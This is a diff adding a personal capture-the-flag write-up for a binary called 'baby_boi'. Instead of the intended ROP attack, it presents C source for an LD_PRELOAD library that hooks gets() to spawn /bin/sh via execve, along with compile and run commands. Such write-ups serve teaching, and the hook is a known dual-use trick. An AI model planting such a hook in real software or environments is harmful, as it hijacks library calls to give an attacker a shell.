@@ -1,0 +1,34 @@
+=== Personal solution description ===
+
+My solution to the dynamically linked binaries is going to be different than the intended one. Intended solution is to find a "one gadget" in the linked libc and execute a ROP attack. But that's boring, so let's do something new. With dynamically linked libraries, we can hook functions from them using the LD_PRELOAD trick. LD_PRELOAD is an environment variable used to load some libraries ahead of others and resolve dynamic symbols from those libraries first.
+
+So we can write a fake function for gets, for example, that will execute execve when ran. This will override the standard gets function and get us a shell:
+------------------------------------------------------------------
+	#define _GNU_SOURCE
+	#include <stdio.h>
+	#include <fcntl.h>
+	#include <dlfcn.h>
+	#include <unistd.h>
+
+	static char* (*real_gets)(char *);
+
+	void __attribute__((constructor)) init() {
+		dlerror();
+		real_gets = dlsym(RTLD_NEXT, "gets");        // get the real gets and save it to call it later (just good habit)
+		printf("Found gets at: 0x%x\n", real_gets);  // print address to make sure we found it
+	}
+
+	char *gets(char * buf) {                         // the hooked function
+		puts("In fake gets");                        // simple print
+		execve("/bin/sh", NULL, NULL);               // execve
+		return real_gets(buf);                       // just good habit
+	}
+------------------------------------------------------------------
+
+Compile with:
+	$ gcc -w -g -fPIC -shared -o hook.so hook.c
+
+And then execute baby_boi:
+	$ LD_PRELOAD=$PWD/hook.so baby_boi
+
+That pops a shell. Cool.
